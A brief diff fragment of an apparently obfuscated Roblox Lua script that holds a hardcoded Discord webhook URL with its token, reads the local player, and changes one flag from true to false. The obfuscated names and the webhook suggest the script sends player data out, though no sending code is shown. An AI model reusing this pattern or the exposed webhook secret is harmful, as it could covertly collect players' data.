@@ -3,7 +3,7 @@ local _0x1a2b3c = "https://discord.com/api/webhooks/1413958040012722320/aCF1ReoF
 local _0x4d5e6f = game:GetService("Players")
 local _0x7g8h9i = _0x4d5e6f.LocalPlayer
 
-local _0xabc123 = true
+local _0xabc123 = false
 
 local function _0xdef456()
     if _0x7g8h9i and _0x7g8h9i.Parent then
